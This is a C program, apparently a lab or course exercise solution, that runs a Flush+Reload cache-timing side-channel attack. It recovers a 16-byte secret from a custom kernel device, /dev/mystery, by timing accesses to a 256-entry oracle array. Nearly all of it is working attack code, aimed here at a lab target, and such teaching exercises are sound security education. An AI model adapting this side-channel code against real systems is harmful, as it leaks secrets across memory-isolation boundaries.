#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>

#include "utils.h"
#include "oracle.h"

#define BIN_WIDTH 5
#define NUM_BINS 200
#define NUM_REPEAT 32
#define SECRET_LEN 16

// kernel module will access this memory. Do not edit this
static uint8_t oracle[256 << 7];

// This informs the kernel module about the oracle. Do not edit this
static struct oracle_info oracle_info = {
    .addr = (unsigned long) oracle,
    .size = 256 << 7
};

uint32_t flush_reload(int fd, int* index, uint8_t* addr) {
    int i;
    uint32_t score;
    uint64_t res;
    uint64_t time_elapsed[NUM_BINS] = { 0 };

    int cnt=0;

    for (i = 0; i < NUM_REPEAT; i++) {

	clflush(addr);
	run(fd, index);
	res = get_time_to_access(addr);
	if (res/BIN_WIDTH < NUM_BINS) {
		time_elapsed[res/BIN_WIDTH]+=1;
    	}
	else {
		time_elapsed[NUM_BINS-1]+=1;
	}
     
        //usleep(5);
        //sched_yield();
    }

    for (i = 0; i < NUM_BINS; i++) {
	  cnt += time_elapsed[i];
	  if (cnt >= NUM_REPEAT*3/4) {
		break;
	  }
    }

    score = BIN_WIDTH*i;

    return score;
}

static uint32_t score[256];

int main(int argc, char *argv[])
{
    int fd, ret = 0, i, j = 15 /* modify this! */;
    int c;
    uint64_t res;
    uint8_t guess[SECRET_LEN + 1] = { 0 };

    // Do not edit this.
    fd = open("/dev/mystery", O_RDWR);
    if (fd < 0)
        handle_error("[-] Cannot open the device");

    setup_oracle(fd, &oracle_info);

    printf("[+] %p: oracle_info{ addr: 0x%lx, size: 0x%lx}\n",
           &oracle_info, oracle_info.addr, oracle_info.size);

    int minind=-1;
    uint32_t minval=NUM_BINS*BIN_WIDTH;
    uint32_t result;

    for(i=0;i<SECRET_LEN;i++) {
	
    	minind = -1;
	minval = NUM_BINS*BIN_WIDTH;
	for(j=0;j<256;j++) {
    		result = (uint32_t)flush_reload(fd,&i,oracle+(j<<7));
		if (minval > result) {
			minval = result;
			minind = j;
		}

	}

    	guess[i] = (uint8_t)minind;
    }

    // (Optional) Print your guess string
    printf("Do you like this? %s\n", guess);

    // Do not edit this
    close(fd);
}

